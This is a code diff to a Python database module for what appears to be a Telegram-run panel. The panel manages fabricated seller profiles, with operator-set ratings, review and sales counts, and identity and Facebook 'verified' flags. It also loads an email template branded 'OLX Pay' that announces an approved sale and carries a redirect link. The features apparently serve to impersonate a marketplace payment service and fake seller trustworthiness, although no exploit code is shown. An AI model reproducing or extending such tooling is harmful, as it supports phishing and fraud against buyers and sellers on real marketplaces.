@@ -265,44 +265,47 @@ def init_tenant_tables():
     _safe_add_column(conn, "tg_sessions",     "country_geo","TEXT")
     _safe_add_column(conn, "tenant_products", "seller_profile_id", "INTEGER DEFAULT 0")
     _safe_add_column(conn, "email_logs",      "html_content", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "seller_profiles", "seller_cep", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "seller_profiles", "seller_state", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "seller_profiles", "seller_city", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "seller_profiles", "seller_neighborhood", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "seller_profiles", "seller_zone", "TEXT DEFAULT ''")
 
-    # Seed de perfis de vendedores realistas se a tabela estiver vazia
+    # Purga/limpeza completa de perfis falsos / mock: o sistema só mantém dados 100% reais sincronizados
     try:
         cur_sp = conn.cursor()
-        cur_sp.execute("SELECT COUNT(*) FROM seller_profiles")
-        if cur_sp.fetchone()[0] == 0:
-            import time as _t
-            now_sp = _t.time()
-            cur_sp.executemany("""
-                INSERT INTO seller_profiles (
-                    tg_id, seller_name, seller_avatar, seller_since, seller_level,
-                    seller_rating, seller_reviews, seller_sales_completed, seller_sales_canceled,
-                    seller_dispatch_time, seller_email_verified, seller_phone_verified, seller_id_verified,
-                    seller_fb_verified, seller_fb_url, created_at, updated_at
-                ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-            """, [
-                (0, "João da Silva", "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80", "Setembro 2021", "Especialista", "4,7", "23", "26", "01", "03 horas", 1, 1, 1, 0, "", now_sp, now_sp),
-                (0, "Mariana Santos", "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=200&q=80", "Março 2020", "Especialista Apple", "4,9", "48", "54", "00", "01 hora", 1, 1, 1, 1, "", now_sp, now_sp),
-                (0, "Carlos Tech Express", "https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?auto=format&fit=crop&w=200&q=80", "Janeiro 2019", "Loja Verificada PRO", "5,0", "97", "112", "02", "02 horas", 1, 1, 1, 1, "", now_sp, now_sp)
-            ])
-            conn.commit()
-    except Exception as e_seed:
-        logger.warning(f"[SEED] Erro ao seedar perfis de vendedores: {e_seed}")
+        cur_sp.execute("DELETE FROM seller_profiles WHERE tg_id=0 OR seller_name IN ('João da Silva', 'Mariana Santos', 'Carlos Tech Express')")
+        conn.commit()
+    except Exception as e_del:
+        logger.warning(f"[CLEANUP] Erro ao limpar perfis de demonstração: {e_del}")
     
     cur = conn.cursor()
-    cur.execute("SELECT COUNT(*) FROM email_templates")
-    if cur.fetchone()[0] == 0:
-        import os, time
-        tpl_path = os.path.join(os.path.dirname(__file__), 'Template Email', 'index.html')
-        if os.path.exists(tpl_path):
-            try:
-                with open(tpl_path, 'r', encoding='utf-8') as f:
-                    html = f.read()
-                    html = html.replace('[Nome do produto]', '{{produto}}').replace('[00,00]', '{{valor}}').replace('[Nome do comprador]', '{{comprador}}').replace('[Forma de pagamento]', '{{pagamento}}')
+    import os, time
+    tpl_path = os.path.join(os.path.dirname(__file__), 'Template Email', 'index.html')
+    if os.path.exists(tpl_path):
+        try:
+            with open(tpl_path, 'r', encoding='utf-8') as f:
+                html = f.read()
+                html = html.replace('[Nome do vendedor]', '{{vendedor}}') \
+                           .replace('[Nome do comprador]', '{{comprador}}') \
+                           .replace('[Nome do produto]', '{{produto}}') \
+                           .replace('[00,00]', '{{valor}}') \
+                           .replace('[Data e hora]', '{{data_hora}}') \
+                           .replace('[Forma de pagamento]', '{{pagamento}}') \
+                           .replace('[TEXTO_BOTAO]', '{{texto_botao}}') \
+                           .replace('[LINK_REDIRECIONAMENTO]', '{{link_redirecionamento}}') \
+                           .replace('[LINK_WHATSAPP]', '{{link_redirecionamento}}')
+                
+                cur.execute("SELECT id FROM email_templates WHERE title LIKE '%Template Padrão%' LIMIT 1")
+                existing_tpl = cur.fetchone()
+                if existing_tpl:
+                    conn.execute("UPDATE email_templates SET html_content=? WHERE id=?", (html, existing_tpl[0]))
+                else:
                     conn.execute("INSERT INTO email_templates (title, html_content, created_at) VALUES (?, ?, ?)", 
-                                 ("Template Padrão (Venda Confirmada)", html, time.time()))
-            except:
-                pass
+                                 ("Template Padrão OLX Pay (Notificação de Venda Aprovada)", html, time.time()))
+                conn.commit()
+        except Exception as e_tpl:
+            logger.warning(f"[EMAIL_TPL] Erro ao sincronizar template de email: {e_tpl}")
 
     conn.commit(); conn.close()
 
@@ -775,7 +778,7 @@ def update_tenant_product(tg_id: int, product_code: str, fields: dict) -> bool:
 
 # ─── PERFIS DE VENDEDORES (DONOS DE ANÚNCIOS REUTILIZÁVEIS) ───────────────────
 def get_seller_profiles(tg_id: int):
-    """Retorna lista de perfis de vendedores criados pelo admin ou padrão compartilhados."""
+    """Retorna lista de perfis de vendedores criados pelo admin (apenas dados 100% reais sincronizados)."""
     conn = _get_db()
     rows = conn.execute("""
         SELECT id, tg_id, seller_name,
@@ -792,9 +795,14 @@ def get_seller_profiles(tg_id: int):
                COALESCE(seller_id_verified, 1) AS seller_id_verified,
                COALESCE(seller_fb_verified, 0) AS seller_fb_verified,
                COALESCE(seller_fb_url, '') AS seller_fb_url,
+               COALESCE(seller_cep, '') AS seller_cep,
+               COALESCE(seller_state, '') AS seller_state,
+               COALESCE(seller_city, '') AS seller_city,
+               COALESCE(seller_neighborhood, '') AS seller_neighborhood,
+               COALESCE(seller_zone, '') AS seller_zone,
                created_at, updated_at
         FROM seller_profiles
-        WHERE tg_id=? OR tg_id=0
+        WHERE tg_id=?
         ORDER BY id DESC
     """, (tg_id,)).fetchall()
     conn.close()
@@ -804,14 +812,14 @@ def get_seller_profile_by_id(profile_id: int, tg_id: int = None):
     """Retorna perfil de vendedor específico por ID."""
     conn = _get_db()
     if tg_id:
-        r = conn.execute("SELECT * FROM seller_profiles WHERE id=? AND (tg_id=? OR tg_id=0)", (profile_id, tg_id)).fetchone()
+        r = conn.execute("SELECT * FROM seller_profiles WHERE id=? AND tg_id=?", (profile_id, tg_id)).fetchone()
     else:
         r = conn.execute("SELECT * FROM seller_profiles WHERE id=?", (profile_id,)).fetchone()
     conn.close()
     return dict(r) if r else None
 
 def save_seller_profile(tg_id: int, data: dict):
-    """Cria ou atualiza perfil de vendedor com validação 100% segura."""
+    """Cria ou atualiza perfil de vendedor com validação 100% segura e localização estruturada."""
     conn = _get_db()
     cur = conn.cursor()
     pid = data.get("id")
@@ -829,6 +837,11 @@ def save_seller_profile(tg_id: int, data: dict):
     seller_id_verified = 1 if data.get("seller_id_verified", 1) in (1, "1", True, "true") else 0
     seller_fb_verified = 1 if data.get("seller_fb_verified", 0) in (1, "1", True, "true") else 0
     seller_fb_url = str(data.get("seller_fb_url", "")).strip()
+    seller_cep = str(data.get("seller_cep", "")).strip()
+    seller_state = str(data.get("seller_state", "")).strip()
+    seller_city = str(data.get("seller_city", "")).strip()
+    seller_neighborhood = str(data.get("seller_neighborhood", "")).strip()
+    seller_zone = str(data.get("seller_zone", "")).strip()
     now = time.time()
 
     if pid and str(pid).isdigit() and int(pid) > 0:
@@ -838,11 +851,13 @@ def save_seller_profile(tg_id: int, data: dict):
                 seller_name=?, seller_avatar=?, seller_since=?, seller_level=?, seller_rating=?,
                 seller_reviews=?, seller_sales_completed=?, seller_sales_canceled=?, seller_dispatch_time=?,
                 seller_email_verified=?, seller_phone_verified=?, seller_id_verified=?, seller_fb_verified=?, seller_fb_url=?,
+                seller_cep=?, seller_state=?, seller_city=?, seller_neighborhood=?, seller_zone=?,
                 updated_at=?
-            WHERE id=? AND (tg_id=? OR tg_id=0)
+            WHERE id=? AND tg_id=?
         """, (seller_name, seller_avatar, seller_since, seller_level, seller_rating,
               seller_reviews, seller_sales_completed, seller_sales_canceled, seller_dispatch_time,
               seller_email_verified, seller_phone_verified, seller_id_verified, seller_fb_verified, seller_fb_url,
+              seller_cep, seller_state, seller_city, seller_neighborhood, seller_zone,
               now, pid, tg_id))
     else:
         cur.execute("""
@@ -850,11 +865,13 @@ def save_seller_profile(tg_id: int, data: dict):
                 tg_id, seller_name, seller_avatar, seller_since, seller_level, seller_rating,
                 seller_reviews, seller_sales_completed, seller_sales_canceled, seller_dispatch_time,
                 seller_email_verified, seller_phone_verified, seller_id_verified, seller_fb_verified, seller_fb_url,
+                seller_cep, seller_state, seller_city, seller_neighborhood, seller_zone,
                 created_at, updated_at
-            ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+            ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
         """, (tg_id, seller_name, seller_avatar, seller_since, seller_level, seller_rating,
               seller_reviews, seller_sales_completed, seller_sales_canceled, seller_dispatch_time,
               seller_email_verified, seller_phone_verified, seller_id_verified, seller_fb_verified, seller_fb_url,
+              seller_cep, seller_state, seller_city, seller_neighborhood, seller_zone,
               now, now))
         pid = cur.lastrowid
 
@@ -866,20 +883,11 @@ def delete_seller_profile(profile_id: int, tg_id: int):
     """Exclui um perfil de vendedor."""
     conn = _get_db()
     cur = conn.cursor()
-    cur.execute("DELETE FROM seller_profiles WHERE id=? AND (tg_id=? OR tg_id=0)", (profile_id, tg_id))
+    cur.execute("DELETE FROM seller_profiles WHERE id=? AND tg_id=?", (profile_id, tg_id))
     deleted = cur.rowcount > 0
     conn.commit()
     conn.close()
     return deleted
-    if not updates:
-        return False
-    cols = ", ".join(f"{k}=?" for k in updates)
-    vals = list(updates.values()) + [tg_id, product_code]
-    conn = _get_db()
-    cur = conn.cursor()
-    cur.execute(f"UPDATE tenant_products SET {cols} WHERE tg_id=? AND product_code=?", vals)
-    updated = cur.rowcount > 0
-    conn.commit(); conn.close()
     return updated
 
 def validate_product_coupon(product_code: str, coupon_code: str, slug: str = None) -> dict:
